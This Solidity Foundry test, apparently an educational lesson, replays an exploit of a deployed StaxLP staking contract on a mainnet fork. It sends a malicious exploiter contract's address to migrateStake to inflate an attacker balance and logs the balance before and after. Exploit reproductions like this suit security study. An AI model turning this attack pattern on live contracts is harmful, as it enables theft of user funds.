// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Lesson 1 - StaxLPStaking.sol";

contract StaxLPStakingExploitTest is Test {
    StaxLPStaking public stax;
    StaxLPExploiter public staxExploitContract;

    // setup function runs before tests begin
    function setUp() public {
        // change to the point in time of the exploit
        vm.rollFork(15725067);

        // The address of the deployed StaxLPStaking contract
        stax = StaxLPStaking(0xd2869042E12a3506100af1D192b5b04D65137941);

        // the malicious contract we want to deploy
        staxExploitContract = new StaxLPExploiter();
    }

    // anything prefixed with test will start with the
    function testStaxExecuteHack() public {
        // VM cheat code that sets address to 3
        vm.startPrank(address(3));
        console.log("Balance before execution: ", stax.balanceOf(address(3)));

        stax.migrateStake(address(staxExploitContract), 10000000000);
        console.log("Balance after exploit: ", stax.balanceOf(address(3)));
    }
}
